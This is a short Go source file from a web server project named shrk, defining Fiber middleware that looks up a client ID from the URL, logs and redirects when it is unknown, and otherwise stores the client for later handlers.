package routes

import (
	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

func VerifyClient(c *fiber.Ctx) error {
	var (
		client_id string
		client    *database.Client
	)

	client_id = c.Params("cid") // dont do drugs kids

	if client, _ = c.Locals("database").(*database.Type).ClientGet(client_id); client == nil {
		log.Debg("tried to access an invalid client: %s", client_id)
		return util.Redirect(c, "/")
	}

	c.Locals("client", client)
	return c.Next()
}
